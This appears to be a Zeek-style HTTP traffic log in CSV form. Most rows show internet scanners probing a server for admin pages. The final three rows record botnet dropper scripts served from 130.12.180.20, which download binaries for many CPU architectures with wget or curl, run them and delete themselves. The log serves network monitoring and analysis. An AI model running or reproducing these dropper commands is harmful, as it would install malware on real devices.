ts,uid,orig_h,orig_p,resp_h,resp_p,method,host,uri,referrer,user_agent,status_code,request_body,response_body,trans_depth,version,request_body_len,response_body_len
1767916806.13887,Clcu2o2yC4vM74Nnla,,,,,GET,211.115.206.12,/admin/config.php,,xfa1,404.0,,"<!DOCTYPE html>

<html dir=""ltr"" lang=""en"" prefix=""content: http://purl.org/rss/1.0/modules/content/  dc: http://purl.org/dc/terms/  foaf: http://xmlns.com/foaf/0.1/  og: http://ogp.me/ns#  rdfs: http://www.w3.org/2000/01/rdf-schema#  schema: http://schema.org/  sioc: http://rdfs.org/sioc/ns#  sioct: http://rdfs.org/sioc/types#  skos: http://www.w3.org/2004/02/skos/core#  xsd: http://www.w3.org/2001/XMLSchema# "">
<head>
<meta charset=""utf-8""/>
<meta content=""Drupal 8 (https://www.drupal.org)"" name=""Generator""/>
<meta content=""width"" name=""MobileOptimized""/>
<meta content=""true"" name=""HandheldFriendly""/>
<meta content=""width=device-width, initial-scale=1.0"" name=""viewport""/>
<link href=""/core/misc/favicon.ico"" rel=""shortcut icon"" type=""image/vnd.microsoft.icon""/>
<title>Page not found | user's Site</title>
<link href=""/sites/default/files/css/css_5Mz0wpOL20s_SQKXnhCWyA5ZJOgQQg26tUyGV0jHiCA.css?pdgcng"" media=""all"" rel=""stylesheet""/>
<link href=""/sites/default/files/css/css_1Vs-se15DhDFHRhxIEwgG9PQN6dfdJOpBMSoiT",1,1.1,0,6957
1767916829.106504,CHtxFj4tiSwd7qYRP3,,,,,GET,211.115.206.12,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,,,1,,0,0
1767916962.249816,CrYXv71dgAShScxVCa,,,,,GET,211.115.206.12,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,,,1,,0,0
1767917031.906586,CzImhI1gbODMP6wHe6,,,,,GET,211.115.206.12,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,,,1,,0,0
1767917091.041604,CI2iNfqPz0aNtt9Ca,,,,,GET,httpbin.org,http://httpbin.org/ip,,ProxyPool-Scanner/2.0,,,,1,,0,0
1767917099.429127,CFDLpRDbympbSllPl,,,,,GET,211.115.206.12,/bin/,,,404.0,,"<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
",1,1.1,0,207
1767917268.956004,Cd5XyC3eUZrA72Y2hk,,,,,GET,211.115.206.12,/manager/html,,Mozilla/5.0 zgrab/0.x,404.0,,"<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
",1,1.1,0,207
1767917381.886539,C8Mzq61D46IsEgxXFl,,,,,GET,130.12.180.20,/w.sh,,curl/7.73.0,200.0,,"rm -rf arm4; busybox wget http://130.12.180.20:36695/arm4; chmod 777 arm4; ./arm4
rm -rf arm5; busybox wget http://130.12.180.20:36695/arm5; chmod 777 arm5; ./arm5
rm -rf arm6; busybox wget http://130.12.180.20:36695/arm6; chmod 777 arm6; ./arm6
rm -rf arm7; busybox wget http://130.12.180.20:36695/arm7; chmod 777 arm7; ./arm7
rm -rf m68k; busybox wget http://130.12.180.20:36695/m68k; chmod 777 m68k; ./m68k
rm -rf mips; busybox wget http://130.12.180.20:36695/mips; chmod 777 mips; ./mips
rm -rf mpsl; busybox wget http://130.12.180.20:36695/mpsl; chmod 777 mpsl; ./mpsl
rm -rf ppc; busybox wget http://130.12.180.20:36695/ppc; chmod 777 ppc; ./ppc
rm -rf sh4; busybox wget http://130.12.180.20:36695/sh4; chmod 777 sh4; ./sh4
rm -rf spc; busybox wget http://130.12.180.20:36695/spc; chmod 777 spc; ./spc
rm -rf x86; busybox wget http://130.12.180.20:36695/x86; chmod 777 x86; ./x86
rm -rf x86_64; wget http://130.12.180.20:36695/x86_64; chmod 777 x86_64; ./x86_64

rm $0
",1,1.1,0,989
1767917382.154025,C8Mzq61D46IsEgxXFl,,,,,GET,130.12.180.20,/c.sh,,curl/7.73.0,200.0,,"rm -rf arm4; curl -o arm http://130.12.180.20:36695/arm4; chmod 777 arm4; ./arm4
rm -rf arm5; curl -o arm5 http://130.12.180.20:36695/arm5; chmod 777 arm5; ./arm5
rm -rf arm6; curl -o arm6 http://130.12.180.20:36695/arm6; chmod 777 arm6; ./arm6
rm -rf arm7; curl -o arm7 http://130.12.180.20:36695/arm7; chmod 777 arm7; ./arm7
rm -rf m68k; curl -o armm68k http://130.12.180.20:36695/m68k; chmod 777 m68k; ./m68k
rm -rf mips; curl -o mips http://130.12.180.20:36695/mips; chmod 777 mips; ./mips
rm -rf mpsl; curl -o mpsl http://130.12.180.20:36695/mpsl; chmod 777 mpsl; ./mpsl
rm -rf ppc; curl -o ppc http://130.12.180.20:36695/ppc; chmod 777 ppc; ./ppc
rm -rf sh4; curl -o sh4 http://130.12.180.20:36695/sh4; chmod 777 sh4; ./sh4
rm -rf spc; curl -o spc http://130.12.180.20:36695/spc; chmod 777 spc; ./spc
rm -rf x86; curl -o x86 http://130.12.180.20:36695/x86; chmod 777 x86; ./x86
rm -rf x86_64; curl -o x86_64 http://130.12.180.20:36695/x86_64; chmod 777 x86_64; ./x86_64

rm $0
",2,1.1,0,997
1767917382.418721,C8Mzq61D46IsEgxXFl,,,,,GET,130.12.180.20,/wget.sh,,curl/7.73.0,200.0,,"rm -rf arm4; wget http://130.12.180.20:36695/arm4; chmod 777 arm4; ./arm4
rm -rf arm5; wget http://130.12.180.20:36695/arm5; chmod 777 arm5; ./arm5
rm -rf arm6; wget http://130.12.180.20:36695/arm6; chmod 777 arm6; ./arm6
rm -rf arm7; wget http://130.12.180.20:36695/arm7; chmod 777 arm7; ./arm7
rm -rf m68k; wget http://130.12.180.20:36695/m68k; chmod 777 m68k; ./m68k
rm -rf mips; wget http://130.12.180.20:36695/mips; chmod 777 mips; ./mips
rm -rf mpsl; wget http://130.12.180.20:36695/mpsl; chmod 777 mpsl; ./mpsl
rm -rf ppc; wget http://130.12.180.20:36695/ppc; chmod 777 ppc; ./ppc
rm -rf sh4; wget http://130.12.180.20:36695/sh4; chmod 777 sh4; ./sh4
rm -rf spc; wget http://130.12.180.20:36695/spc; chmod 777 spc; ./spc
rm -rf x86; wget http://130.12.180.20:36695/x86; chmod 777 x86; ./x86
rm -rf x86_64; wget http://130.12.180.20:36695/x86_64; chmod 777 x86_64; ./x86_64

rm $0
",3,1.1,0,887
